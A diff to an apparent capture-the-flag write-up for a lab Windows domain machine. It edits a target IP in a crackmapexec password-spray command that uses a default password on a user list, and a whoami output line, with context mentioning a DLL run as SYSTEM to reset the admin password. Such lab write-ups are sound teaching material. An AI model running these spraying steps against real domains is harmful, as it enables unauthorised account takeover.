@@ -73,7 +73,7 @@ megabank.local\marko    Account created. Password set to Welcome123!
 `marko:Welcome123!` doesn't work -- the password was probably changed. But if that's the default password for new accounts, maybe someone else never changed theirs:
 
 ```bash
-crackmapexec smb 10.129.162.167 -u user_list -p 'Welcome123!' --no-bruteforce
+crackmapexec smb 10.129.96.155 -u user_list -p 'Welcome123!' --no-bruteforce
 
 [+] megabank.local\melanie:Welcome123!
 ```
@@ -138,7 +138,7 @@ The DLL executes as SYSTEM, resetting the admin password. Log in with `evil-winr
 
 {{< terminal title="root@resolute" >}}
 whoami
-nt authority\system
+megabank\administrator
 {{< /terminal >}}
 
 ---
